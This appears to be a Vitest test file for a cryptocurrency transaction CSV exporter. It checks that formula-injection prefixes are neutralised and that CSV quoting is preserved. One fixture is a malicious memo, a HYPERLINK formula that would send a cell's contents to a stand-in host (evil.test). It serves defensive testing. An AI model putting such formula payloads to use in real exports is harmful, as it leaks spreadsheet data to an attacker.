import { describe, expect, it } from 'vitest'
import { toCsv } from './transactionCsv'
import type { TransactionEvent } from '../hooks/useTransactionHistory'

const tx: TransactionEvent = {
  timestamp: '2026-09-28T00:00:00Z', direction: 'in', amount: '1.25',
  counterparty: 'GACCOUNT', memo: '', txHash: 'abc123',
}

describe('transaction CSV', () => {
  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '  =1+1', '\ttext', ' \rtext', '\n=1+1'])(
    'neutralizes dangerous prefixes in every data column: %j',
    (value) => {
      const csv = toCsv([{ ...tx, memo: value, counterparty: value, txHash: value, amount: value, timestamp: value }])
      expect(csv.match(new RegExp("'", 'g'))).toHaveLength(5)
      expect(csv).toContain(`"'${value}"`)
    }
  )

  it('neutralizes a malicious memo while preserving CSV quoting', () => {
    const memo = '=HYPERLINK("https://evil.test/?"&A1,"click")'
    expect(toCsv([{ ...tx, memo }])).toContain('"\'=HYPERLINK(""https://evil.test/?""&A1,""click"")"')
  })

  it('preserves commas, quotes, newlines, empty memos, and the header', () => {
    expect(toCsv([{ ...tx, memo: 'a,"b"\nc' }, { ...tx, memo: undefined }])).toBe(
      '"Date","Direction","Amount (XLM)","Counterparty","Memo","Transaction Hash"\r\n' +
      '"2026-09-28T00:00:00Z","in","1.25","GACCOUNT","a,""b""\nc","abc123"\r\n' +
      '"2026-09-28T00:00:00Z","in","1.25","GACCOUNT","","abc123"'
    )
  })
})
